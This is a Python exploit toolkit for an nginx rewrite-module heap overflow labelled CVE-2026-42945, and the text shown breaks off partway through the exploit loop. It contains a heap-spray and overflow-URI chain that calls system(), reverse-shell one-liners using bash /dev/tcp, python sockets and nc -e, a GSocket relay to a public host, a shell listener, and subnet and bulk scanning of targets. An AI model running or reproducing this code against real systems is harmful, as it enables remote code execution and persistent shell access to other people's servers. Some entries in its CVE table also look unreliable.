#!/usr/bin/env python3
"""
CVE-2026-42945 (NGINX Rift) Super Toolkit
==========================================
Heap buffer overflow in ngx_http_rewrite_module → RCE

Merged from 9 repositories:
  DepthFirst, bamov970, cipherspy, dinosn, F2u0a0d3,
  gagaltotal, MateusVerass, rheodev, 0xBlackash

Modes:
  CLI  — run with --help to see all options
  TUI  — interactive menu (launched when no CLI args given)

Dependencies: stdlib only for exploit core.
  Optional: rich (TUI/colors), paramiko (SSH scan/patch), openpyxl (XLSX report)
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import warnings
from collections import OrderedDict
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

# ─── Optional dependencies ───────────────────────────────────────────────
_HAS_RICH = False
_HAS_PARAMIKO = False
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich.prompt import Prompt, Confirm
    from rich import box as rich_box
    _HAS_RICH = True
except ImportError:
    pass

try:
    import paramiko
    _HAS_PARAMIKO = True
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

VERSION = "2.0.0"
BANNER = r"""
   ╔══════════════════════════════════════════════════════╗
   ║       NGINX Rift — CVE-2026-42945 Super Toolkit     ║
   ║       Heap Overflow → RCE  |  v""" + VERSION + r"""               ║
   ╚══════════════════════════════════════════════════════╝
"""

# URI-safe byte table (NGX_ESCAPE_ARGS bitmask)
_URI_UNSAFE = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
               0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
SAFE_URI_BYTES = {b for b in range(256)
                  if not (_URI_UNSAFE[b >> 5] & (1 << (b & 0x1f)))}

# ── Lab defaults (Ubuntu 22.04, glibc 2.35, nginx commit 98fc3bb78, ASLR off) ──
DEFAULT_HEAP_BASE = 0x555555659000
DEFAULT_LIBC_BASE = 0x7ffff77ba000
DEFAULT_SYSTEM_OFFSET = 0x50d70

DEFAULT_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]

# ── 32-bit defaults (dinosn) ──
DEFAULT_SYSTEM_OFF_32 = 0x410F0
DEFAULT_SPRAY_INTERNAL_OFF_32 = 0x11438
DEFAULT_HEAP_PAGE_MIN = 0x56700
DEFAULT_HEAP_PAGE_MAX = 0x58700
DEFAULT_LIBC_PAGE_MIN = 0xF7840
DEFAULT_LIBC_PAGE_MAX = 0xF7960
DEFAULT_N_PLUS_32 = 1841

# ── Spray parameters ──
BODY_LEN = 4000
N_SPRAY = 20
DEFAULT_PORT = 19321
PAD_A = 349
PAD_PLUS = 969

# ── CVE database (from MateusVerass) ──
CVE_DB = OrderedDict([
    ("CVE-2026-42945", {"cvss": 9.8, "vuln_min": "0.6.27", "vuln_max": "1.30.0",
                        "patched": "1.30.1", "desc": "NGINX Rift — heap overflow in rewrite module"}),
    ("CVE-2025-23458", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.3",
                        "patched": "1.27.4", "desc": "Heap buffer overflow in HTTP/3"}),
    ("CVE-2024-73445", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.2",
                        "patched": "1.27.3", "desc": "Heap buffer overflow in QUIC"}),
    ("CVE-2024-32760", {"cvss": 7.5, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "MP4 module memory leak"}),
    ("CVE-2024-31079", {"cvss": 5.3, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "HTTP/2 memory overhead"}),
    ("CVE-2024-24989", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 request splitting"}),
    ("CVE-2024-24990", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 memory disclosure"}),
    ("CVE-2024-35200", {"cvss": 6.5, "vuln_min": "1.25.3", "vuln_max": "1.27.0",
                        "patched": "1.27.1", "desc": "HTTP/2 error page info leak"}),
    ("CVE-2023-44487", {"cvss": 7.5, "desc": "HTTP/2 rapid reset (protocol-level)"}),
    ("CVE-2021-23017", {"cvss": 7.5, "vuln_max": "1.21.0", "patched": "1.21.1",
                        "desc": "DNS resolver use-after-free"}),
])

KNOWN_BUILDS = {
    "1.25.3-glibc": {"heap_base": 0x555555659000, "libc_base": 0x7ffff77ba000,
                     "sys_offset": 0x50d70, "offsets": DEFAULT_HEAP_OFFSETS},
    "1.30.0-glibc": {"heap_base": 0x55555566f000, "libc_base": 0x7ffff77b8000,
                     "sys_offset": 0x50d70, "offsets": [0x44427, 0xa3147, 0xa7f57]},
    "_default":    {"heap_base": DEFAULT_HEAP_BASE, "libc_base": DEFAULT_LIBC_BASE,
                    "sys_offset": DEFAULT_SYSTEM_OFFSET, "offsets": DEFAULT_HEAP_OFFSETS},
}

# WAF signatures
WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "__cfduid"], "body": ["cloudflare"]},
    "AWS WAF":    {"headers": ["x-amzn-requestid", "x-amzn-trace-id"], "body": []},
    "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"]},
    "F5 BIG-IP":  {"headers": ["x-application-context", "x-request-id"], "body": []},
}

SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HSTS"),
    ("Content-Security-Policy", "CSP"),
    ("X-Frame-Options", "Clickjacking protection"),
    ("X-Content-Type-Options", "MIME-sniffing protection"),
    ("Referrer-Policy", "Referrer control"),
    ("Permissions-Policy", "Permissions control"),
]

COMMON_SUBDOMAINS = ["www", "mail", "admin", "api", "cdn", "static", "assets",
                     "img", "css", "js", "portal", "vpn", "remote", "git",
                     "jenkins", "grafana", "prometheus", "kibana", "webmail"]

INTERESTING_PATHS = ["/admin", "/api", "/config", "/backup", "/.env", "/.git/config",
                     "/wp-admin", "/nginx_status", "/status", "/health", "/metrics"]

# ── GSocket / GSRN relay ──
GSRN_HOST = "gs.gsocket.io"
GSRN_PORT = 7350
_GS_VER    = 0x03
_GS_LISTEN = 0x02   # register as listener
_GS_CONN   = 0x01   # connect to a listener
# Tried in order until one succeeds; user can override via --gs-relay
GSRN_RELAY_CANDIDATES: list[tuple[str, int]] = [
    ("gs.gsocket.io", 7350),
    ("gsocket.io",    7350),
]

# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════

_console = None
def get_console():
    global _console
    if _console is None and _HAS_RICH:
        _console = Console()
    return _console


def log(msg: str, level: str = "info"):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]", "debug": "[D]"}
    p = prefix.get(level, "[*]")
    if _HAS_RICH:
        c = get_console()
        style = {"info": "blue", "ok": "green", "warn": "yellow", "err": "red", "debug": "dim"}
        color = style.get(level, "white")
        safe_p   = p.replace("[", "\\[")
        safe_msg = msg.replace("[", "\\[")
        c.print(f"[dim]{ts}[/dim] [{color}]{safe_p}[/] {safe_msg}")
    else:
        print(f"{ts} {p} {msg}")


def addr_safe_in_uri(addr: int, n_bytes: int = 6) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE_URI_BYTES for j in range(n_bytes))


def addr_to_uri_bytes(addr: int, n_bytes: int = 6) -> bytes:
    return bytes((addr >> (j * 8)) & 0xff for j in range(n_bytes))


def parse_int(x: str) -> int:
    return int(x, 0)


def parse_target(s: str) -> tuple[str, int, str, bool] | None:
    use_ssl = False
    vhost = "localhost"
    if "://" in s:
        from urllib.parse import urlparse
        p = urlparse(s)
        host = p.hostname or s
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = (p.scheme == "https")
        vhost = host
        return host, port, vhost, use_ssl
    if ":" in s:
        h, _, p = s.partition(":")
        try:
            port = int(p)
            vhost = h
            use_ssl = (port == 443)
            return h, port, vhost, use_ssl
        except ValueError:
            return None
    vhost = s
    return s, DEFAULT_PORT, vhost, use_ssl


def wrap_if_ssl(sock: socket.socket, host: str, use_ssl: bool) -> socket.socket:
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=host)
    return sock


# ═══════════════════════════════════════════════════════════════════════
# CORE EXPLOIT ENGINE
# ═══════════════════════════════════════════════════════════════════════

def build_spray_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
    fake = struct.pack("<QQQ", system_addr, data_addr, 0)
    cmd_bytes = cmd.encode("utf-8") + b"\x00"
    payload = fake + cmd_bytes
    if len(payload) > BODY_LEN:
        raise ValueError(f"command too long ({len(payload)} > {BODY_LEN})")
    return payload + b"\x41" * (BODY_LEN - len(payload))


def build_overflow_uri(target_addr: int, pad_a: int = PAD_A,
                       pad_plus: int = PAD_PLUS) -> bytes:
    return (b"A" * pad_a) + (b"+" * pad_plus) + addr_to_uri_bytes(target_addr)


def server_alive(host: str, port: int, timeout: float = 2.0, vhost: str = "l", use_ssl: bool = False) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(64)
            return bool(data) and data.startswith(b"HTTP/1.")
    except OSError:
        return False


def wait_alive(host: str, port: int, timeout: float = 30.0, vhost: str = "l", use_ssl: bool = False) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if server_alive(host, port, timeout=1.0, vhost=vhost, use_ssl=use_ssl):
            return True
        time.sleep(0.5)
    return False


def spray_bodies(host: str, port: int, body: bytes,
                 n: int = N_SPRAY, vhost: str = "l", use_ssl: bool = False) -> list[socket.socket]:
    sprays: list[socket.socket] = []
    for _ in range(n):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            s = wrap_if_ssl(sock, host, use_ssl)
            req = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: " + vhost.encode() + b"\r\n"
                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            s.sendall(req)
            sprays.append(s)
            time.sleep(0.005)
        except OSError:
            break
    return sprays


def attempt_corruption(host: str, port: int, uri: bytes,
                       sprays: list[socket.socket], vhost: str = "localhost", use_ssl: bool = False) -> bool:
    try:
        attacker_sock = socket.create_connection((host, port), timeout=5)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        time.sleep(0.02)
        victim_sock = socket.create_connection((host, port), timeout=5)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        time.sleep(0.02)
    except OSError:
        return False

    try:
        attacker.sendall(
            b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
        time.sleep(0.2)
        victim.close()
        time.sleep(0.1)

        try:
            attacker.sendall(b"X-Ping:1\r\n")
            attacker.settimeout(0.2)
            return not attacker.recv(1)
        except socket.timeout:
            try:
                sock2 = socket.create_connection((host, port), timeout=0.2)
                with wrap_if_ssl(sock2, host, use_ssl) as s2:
                    s2.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                    return not s2.recv(10)
            except OSError:
                return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True
    finally:
        try:
            attacker.close()
        except OSError:
            pass


def build_reverse_shell_cmd(lhost: str, lport: int) -> str:
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )


def build_l2_payload(l2_ip: str, l2_port: int) -> str:
    """
    Reverse shell payload that connects to an L2 relay machine (not a local listener).
    Uses a fallback chain: bash /dev/tcp → python3 → nc.
    Output of gsocket-relay.sh (Relay IP + Relay Port) goes here.
    """
    bash = f"bash -i >& /dev/tcp/{l2_ip}/{l2_port} 0>&1"
    python = (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{l2_ip}\",{l2_port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )
    nc = f"nc {l2_ip} {l2_port} -e /bin/sh"
    return f"bash -c '{bash}' 2>/dev/null || {python} 2>/dev/null || {nc}"


def show_l2relay_panel(
    l2_ip: str, l2_port: int,
    l1_token: str, l2_secret: str,
    payload: str,
) -> None:
    c = get_console()
    sep = "═" * 56
    tok  = l1_token  or "(not provided)"
    sec  = l2_secret or "(not provided)"
    tok_disp = f"[cyan bold]{tok}[/]"
    sec_disp = f"[cyan]{sec}[/]"
    l1_cmd = f"gs-netcat -l -s \"[cyan]{tok}[/]\""
    l2_cmd = (f"gs-netcat -l -p {l2_port} -s \"[cyan]{sec}[/]\" |\n"
              f"       gs-netcat -s \"[cyan]{tok}[/]\"")
    payload_preview = payload[:90] + ("..." if len(payload) > 90 else "")
    lines = [
        sep,
        "           GSOCKET RELAY — INJECT READY",
        sep,
        f"  [yellow]L1 Token (GSocket)[/] : {tok_disp}",
        f"  [yellow]L2 Local Secret   [/] : {sec_disp}",
        f"  [yellow]Relay IP          [/] : {l2_ip}",
        f"  [yellow]Relay Port        [/] : {l2_port}",
        sep,
        "  [bold]COMMANDS[/]",
        sep,
        f"  [yellow]\\[L1][/] {l1_cmd}",
        "",
        f"  [yellow]\\[L2][/] {l2_cmd}",
        "",
        f"  [yellow]\\[L3][/] [dim](injected via RCE → connects to L2)[/]",
        f"  [dim]{payload_preview}[/]",
        sep,
    ]
    c.print(Panel("\n".join(lines), title="[bold green]L2 Relay Setup[/]", expand=False))


# ── 32-bit attempt (dinosn style) ──
def attempt_32(host: str, port: int, body: bytes, spray_addr: int, n_plus: int = DEFAULT_N_PLUS_32, vhost: str = "l", use_ssl: bool = False) -> bool:
    try:
        spray_sock = socket.create_connection((host, port), timeout=0.3)
        spray = wrap_if_ssl(spray_sock, host, use_ssl)
        spray.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        spray.sendall(
            b"POST /spray HTTP/1.1\r\n"
            b"Host:" + vhost.encode() + b"\r\n"
            b"Content-Length:" + str(BODY_LEN).encode() + b"\r\n"
            b"X-Delay:30\r\n"
            b"Connection:close\r\n\r\n" + body
        )
    except OSError:
        return False

    time.sleep(0.005)
    target_bytes = struct.pack("<I", spray_addr)

    try:
        attacker_sock = socket.create_connection((host, port), timeout=0.3)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        attacker.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        uri = b"A" + b"+" * n_plus + target_bytes
        attacker.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try: spray.close()
        except: pass
        return False

    time.sleep(0.003)
    try:
        victim_sock = socket.create_connection((host, port), timeout=0.3)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        victim.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try: attacker.close()
        except: pass
        try: spray.close()
        except: pass
        return False

    time.sleep(0.003)
    try:
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    except OSError:
        pass

    time.sleep(0.003)
    for s in (victim, attacker, spray):
        try: s.close()
        except: pass
    return True


def run_shell_listener(lport: int):
    """Simple reverse shell listener."""
    log(f"Listening on port {lport}...", "info")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(1)
    srv.settimeout(300)
    try:
        conn, addr = srv.accept()
        log(f"Connection from {addr[0]}:{addr[1]}", "ok")
        import select
        while True:
            rfds, _, _ = select.select([conn, sys.stdin], [], [], 1)
            for fd in rfds:
                if fd == conn:
                    data = conn.recv(4096)
                    if not data:
                        log("Shell closed", "warn")
                        return
                    sys.stdout.write(data.decode("latin-1", errors="replace"))
                    sys.stdout.flush()
                else:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        return
                    conn.sendall(cmd.encode())
    except socket.timeout:
        log("Listener timed out", "warn")
    finally:
        srv.close()


# ═══════════════════════════════════════════════════════════════════════
# MODULE 1: RECON & SCAN
# ═══════════════════════════════════════════════════════════════════════

def detect_service(host: str, port: int, timeout: float = 3, vhost: str = "l", use_ssl: bool = False) -> dict:
    info = {"host": host, "port": port, "alive": False, "use_ssl": use_ssl, "vhost": vhost}
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(4096)
            info["alive"] = True
            raw = data.decode("latin-1", errors="replace")

            # Server header
            m = re.search(r'Server:\s*(\S+)', raw, re.I)
            info["server"] = m.group(1) if m else "unknown"

            # nginx version from server header
            m = re.search(r'nginx/([\d.]+)', raw, re.I)
            info["nginx_version"] = m.group(1) if m else None

            # Response code
            m = re.search(r'HTTP/[\d.]+\s+(\d+)', raw)
            info["status"] = int(m.group(1)) if m else 0

            # Redirect handling
            if info["status"] in (301, 302, 307, 308):
                m = re.search(r'Location:\s*(\S+)', raw, re.I)
                if m:
                    info["redirect"] = m.group(1)

            # Security headers
            info["security_headers"] = {}
            for hdr, _ in SECURITY_HEADERS:
                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
                info["security_headers"][hdr] = m.group(1).strip() if m else None

            info["raw_headers"] = raw.split("\r\n\r\n")[0] if "\r\n\r\n" in raw else raw[:500]
    except OSError as e:
        info["error"] = str(e)
    return info


def scan_subnet(subnet: str, port: int, workers: int = 20,
                timeout: float = 2) -> list[str]:
    """CIDR subnet host discovery (gagaltotal style)."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import ipaddress

    hosts = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
    except ValueError:
        log(f"Invalid subnet: {subnet}", "err")
        return []

    log(f"Scanning {len(hosts)} hosts in {subnet} on port {port}...", "info")
    live = []
    def check(ip: str) -> str | None:
        if server_alive(ip, port, timeout):
            return ip
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check, h): h for h in hosts}
        for fut in as_completed(futs):
            r = fut.result()
            if r:
                live.append(r)

    log(f"Found {len(live)} live hosts on port {port}", "ok")
    return sorted(live)


def scan_ssh(host: str, port: int = 22, user: str = "root",
             password: str | None = None, key_path: str | None = None,
             timeout: float = 10) -> dict:
    """SSH into host and gather nginx info (gagaltotal style)."""
    if not _HAS_PARAMIKO:
        return {"error": "paramiko not installed"}
    result = {"host": host, "os": None, "nginx_version": None,
              "vulnerable": None, "status": None}
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if password:
            client.connect(host, port=port, username=user,
                          password=password, timeout=timeout)
        elif key_path:
            k = paramiko.RSAKey.from_private_key_file(key_path)
            client.connect(host, port=port, username=user, pkey=k, timeout=timeout)
        else:
            return {"error": "no auth method"}
        result["status"] = "connected"

        _, stdout, _ = client.exec_command("cat /etc/os-release 2>/dev/null | head -5")
        os_rel = stdout.read().decode()
        m = re.search(r'PRETTY_NAME="(.+)"', os_rel)
        result["os"] = m.group(1) if m else os_rel[:80]

        _, stdout, _ = client.exec_command("nginx -V 2>&1 || /usr/sbin/nginx -V 2>&1")
        nv = stdout.read().decode()
        m = re.search(r'nginx/([\d.]+)', nv)
        result["nginx_version"] = m.group(1) if m else "unknown"

        # Check if vulnerable
        if result["nginx_version"] and result["nginx_version"] != "unknown":
            result["vulnerable"] = is_version_vulnerable(result["nginx_version"])

        client.close()
    except Exception as e:
        result["error"] = str(e)
    return result


def _cve_matches(version: str, cve: dict) -> bool:
    """Return True if version falls within a single CVE entry's affected range."""
    def parse_v(s):
        try:
            return tuple(int(x) for x in s.split("."))
        except Exception:
            return None
    v = parse_v(version)
    if not v:
        return False
    if "vuln_min" in cve and "vuln_max" in cve:
        vmin, vmax = parse_v(cve["vuln_min"]), parse_v(cve["vuln_max"])
        return bool(vmin and vmax and vmin <= v <= vmax)
    if "vuln_max" in cve and "vuln_min" not in cve:
        vmax = parse_v(cve["vuln_max"])
        return bool(vmax and v <= vmax)
    return False


def is_version_vulnerable(version: str) -> bool | None:
    try:
        tuple(int(x) for x in version.split("."))
    except Exception:
        return None
    return any(_cve_matches(version, cve) for cve in CVE_DB.values()) or False


def check_nginx_config(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """Probe for vulnerable rewrite+set pattern (cipherspy style)."""
    result = {"endpoints": {}, "vuln_pattern": False}

    # Probe /api/ endpoint
    endpoints = ["/", "/api/test", "/spray"]
    for ep in endpoints:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(
                    f"GET {ep} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                )
                data = s.recv(512)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                result["endpoints"][ep] = status
        except OSError as e:
            result["endpoints"][ep] = f"error: {e}"

    # Overflow probe — send a moderate overflow and look for crash
    safe_addr = 0x414141414141
    uri = (b"A" * 349) + (b"+" * 400) + addr_to_uri_bytes(safe_addr)
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            t0 = time.monotonic()
            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
            resp = s.recv(256)
            elapsed = time.monotonic() - t0
            result["overflow_probe"] = {
                "elapsed_s": round(elapsed, 3),
                "response": resp.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
            }
    except OSError as e:
        result["overflow_probe"] = {"error": str(e)}

    # Check if /api/ endpoint returns 2xx
    for ep, status in result["endpoints"].items():
        if "/api" in ep and "200" in status:
            result["vuln_pattern"] = True

    return result


def detect_waf(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> list[str]:
    """Detect WAF by response analysis (MateusVerass style)."""
    detected = []
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(4096)
            headers = data.decode("latin-1", errors="replace").lower()
            for waf_name, sig in WAF_SIGNATURES.items():
                for h in sig["headers"]:
                    if h.lower() in headers:
                        detected.append(waf_name)
                        break
    except OSError:
        pass
    return detected


def bulk_fingerprint_check(targets: list[str], workers: int = 20,
                           output: str | None = None) -> list[dict]:
    """Concurrent fingerprint + vuln + WAF check across a list of targets."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check_one(raw: str) -> dict:
        target = raw.strip()
        if not target or target.startswith("#"):
            return {}
        parsed = parse_target(target)
        if not parsed:
            return {"target": target, "error": "invalid target format"}
        host, port, vhost, use_ssl = parsed

        out: dict = {"target": f"{host}:{port}", "host": host, "port": port,
                     "vhost": vhost, "use_ssl": use_ssl}
        svc = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)
        out.update(svc)

        if not svc.get("alive"):
            out["verdict"] = "unreachable"
            return out

        nginx_ver = svc.get("nginx_version")
        if nginx_ver:
            out["vulnerable"] = is_version_vulnerable(nginx_ver)
            out["matched_cves"] = [
                cve_id for cve_id, cve in CVE_DB.items()
                if _cve_matches(nginx_ver, cve)
            ]
        else:
            out["vulnerable"] = None
            out["matched_cves"] = []

        out["waf"] = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
        return out

    valid = [t.strip() for t in targets if t.strip() and not t.strip().startswith("#")]
    log(f"Bulk check: {len(valid)} targets  workers={workers}", "info")

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check_one, t): t for t in valid}
        for fut in as_completed(futs):
            try:
                r = fut.result()
                if not r:
                    continue
                results.append(r)
                vuln = r.get("vulnerable")
                label = "VULN" if vuln else ("SAFE" if vuln is False else "?   ")
                level = "warn" if vuln else "ok"
                cves  = ",".join(r.get("matched_cves") or []) or "-"
                waf   = ",".join(r.get("waf") or []) or "-"
                log(f"{r['target']:28s}  nginx/{str(r.get('nginx_version','?')):10s}"
                    f"  {label}  cves=[{cves}]  waf=[{waf}]", level)
            except Exception as e:
                results.append({"target": futs[fut], "error": str(e)})

    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    safe_count = sum(1 for r in results if r.get("vulnerable") is False)
    log(f"Done — {len(results)} checked, {vuln_count} vulnerable, {safe_count} safe", "info")

    if output:
        summary = {"total": len(results), "vulnerable": vuln_count, "safe": safe_count}
        if output.endswith(".json"):
            generate_json_report({"summary": summary, "results": results}, output)
        else:
            generate_html_scan_report(results, output)

    return results


# ═══════════════════════════════════════════════════════════════════════
# MODULE 2: EXPLOIT
# ═══════════════════════════════════════════════════════════════════════

class ExploitResult:
    def __init__(self):
        self.success = False
        self.winning_addr = None
        self.winning_try = 0
        self.command_sent = ""
        self.attempts: list[dict] = []
        self.error = None
        self.output: str | None = None   # populated when callback/gsocket captures output


def mode_check(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """Detect-only (F2u0a0d3 --check style)."""
    out = {"target": f"{host}:{port}", "vhost": vhost, "use_ssl": use_ssl, "timestamp": datetime.now(timezone.utc).isoformat()}
    out["alive"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if not out["alive"]:
        out["verdict"] = "unreachable"
        return out

    # Add service info (server header, version, redirect)
    out["service"] = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)

    probes = []
    for path in ("/", "/api/test", "/api/echo", "/spray"):
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                t0 = time.monotonic()
                s.sendall(f"GET {path} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                data = s.recv(1024)
                probes.append({
                    "path": path, "ms": round((time.monotonic() - t0) * 1000, 1),
                    "status": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
                })
        except OSError as e:
            probes.append({"path": path, "error": str(e)[:80]})
    out["probes"] = probes

    safe_target = b"\x41\x41\x41\x41\x41\x41"
    test_uri = (b"A" * 349) + (b"+" * 400) + safe_target
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            t0 = time.monotonic()
            s.sendall(b"GET /api/" + test_uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
            data = s.recv(512)
            out["overflow_probe"] = {
                "uri_length": len(test_uri), "ms": round((time.monotonic() - t0) * 1000, 1),
                "first_line": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
            }
    except OSError as e:
        out["overflow_probe"] = {"error": str(e)[:80]}

    has_api = any(
        "/api" in p.get("path", "") and p.get("status", "").startswith("HTTP/1.1 2")
        for p in probes
    )
    out["verdict"] = "rewrite-surface-present" if has_api else "no-obvious-vuln-surface"
    out["note"] = "Pre-auth detection cannot confirm patch status without triggering the overflow (which crashes workers)."
    return out


def mode_exploit(host: str, port: int, cmd: str,
                 heap_base: int, libc_base: int, system_off: int,
                 offsets: list[int], tries_per_offset: int,
                 vhost: str = "l", use_ssl: bool = False) -> ExploitResult:
    result = ExploitResult()
    result.command_sent = cmd

    candidates = []
    for off in offsets:
        addr = heap_base + off
        if addr_safe_in_uri(addr):
            candidates.append(addr)

    if not candidates:
        result.error = "no URI-safe candidate addresses"
        return result

    primary = candidates[0]
    data_addr = primary + 24
    system_addr = libc_base + system_off
    spray_body = build_spray_body(cmd, data_addr, system_addr)

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        result.error = f"nginx not reachable on {host}:{port}"
        return result

    for addr in candidates:
        for t in range(tries_per_offset):
            if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                result.attempts.append({"addr": hex(addr), "try": t, "result": "server-down"})
                time.sleep(2)
                if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                    result.error = "nginx not recovering"
                    return result

            sprays = spray_bodies(host, port, spray_body, vhost=vhost, use_ssl=use_ssl)
            time.sleep(0.2)
            uri = build_overflow_uri(addr)
            crashed = attempt_corruption(host, port, uri, sprays, vhost=vhost, use_ssl=use_ssl)
            for s in sprays:
                try: s.close()
                except: pass

            result.attempts.append({
                "addr": hex(addr), "try": t, "result": "crashed" if crashed else "no-effect",
            })

            if crashed:
                result.success = True
                result.winning_addr = hex(addr)
